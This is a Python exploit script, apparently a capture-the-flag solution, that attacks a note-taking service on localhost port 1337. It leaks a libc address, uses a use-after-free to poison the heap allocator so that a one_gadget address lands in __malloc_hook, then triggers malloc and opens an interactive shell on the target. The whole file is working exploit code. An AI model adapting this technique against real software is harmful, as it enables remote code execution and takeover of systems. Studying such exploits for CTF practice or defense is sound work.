#!/usr/bin/python3
#-*-coding:utf-8-*-

import socket, telnetlib, struct, sys, logging

logging.basicConfig(level=logging.DEBUG, format="\x1b[93;41m[-] %(message)s \x1b[0m")

def sock(host, port):
  s = socket.create_connection((host, port))
  return s, s.makefile('rwb', buffering=None)

def read_until(f, delim=b'\n',textwrap=False):
  if type(delim) is str:
      delim = delim.encode()
  dat = b''
  while not dat.endswith(delim): dat += f.read(1)
  return dat if not textwrap else dat.decode()

def readline_after(f, skip_until):
  _ = read_until(f, skip_until)                                                                                       
  return read_until(f)

def sendline(f, line):
  if type(line) is str: 
    line = (line + '\n').encode()
  f.write(line) # no tailing LF in bytes
  f.flush()

def sendline_after(f, waitfor, line):
  read_until(f, waitfor)
  sendline(f, line)

def skips(f, nr):
  for i in range(nr): read_until(f) 

def pQ(a): return struct.pack('<Q', a&0xffffffffffffffff)
def uQ(a): return struct.unpack('<Q', a.ljust(8, b'\x00'))[0]

def shell(s):
  t = telnetlib.Telnet()
  t.sock = s
  t.interact()
    
def dbg(ss):
  fmt = f"{ss} : "
  try:
    val = eval(ss.encode())
    if type(val) is int:
      fmt += f"{hex(val)}"
    elif type(val) is str or type(val) is bytes:
      fmt += f"{val}"
  except NameError:
    fmt = fmt.rstrip(":")
  logging.debug(fmt)

def hexify(a):
  return int(a, 16)

############## Utils #################
def menu():
  _  = read_until(f, '1: create note')
  _ += read_until(f, '2: delete note')
  _ += read_until(f, '3: edit note')
  _ += read_until(f, '4: exit')
  _ += read_until(f, 'Command >> ')
  #print(_)
  return;

def create_note(size, data):
  sendline(f, '1')
  sendline_after(f, '[*] Note data size:', str(size))
  sendline_after(f, '[*] Note data: ', data)
  idx = readline_after(f, '[+] Chunk stored Index: ') 
  idx = int(idx)
  print("chunk idx: %d"%idx)
  return menu(), idx


def delete_note(idx):
  sendline(f, '2')
  sendline_after(f, 'index:', str(idx))
  return menu()

def edit_note(idx, data):
  sendline(f, '3')
  sendline_after(f, 'index: ', str(idx))
  sendline_after(f, 'data: ', data)
  return menu()
  

#### plt/got, rop gadgets, symbs addrs and consts ####
ofs_malloc_hook = 0x3afc30
ofs_free_hook   = 0x3b18e8
ofs_puts        = 0x06dfd0
ofs_onegadget   = (0x41602, 0x41656, 0xc1380, 0xdeec2, 0xdeece)
banner = 'test'
HOST, PORT = '127.0.0.1', 1337 

logging.info(banner)
s, f = sock(HOST, PORT)


addr_puts = hexify(readline_after(f, ': ').strip().decode())
libc_base   = addr_puts - ofs_puts
malloc_hook = libc_base + ofs_malloc_hook 
one_gadget  = libc_base + ofs_onegadget[1]
dbg("addr_puts")
dbg("libc_base")
dbg("malloc_hook")
dbg("one_gadget")
_, A = create_note(0x10, b'A' * 0xf)
delete_note(A)
edit_note(A, pQ(malloc_hook)* 2)

_, X = create_note(0x10, b'\n')
_, Y = create_note(0x10, pQ(one_gadget) + b'\n')
input('gdb?')
# trigger malloc_hook

sendline(f, '1')
sendline_after(f, ':', str(1))
shell(s)
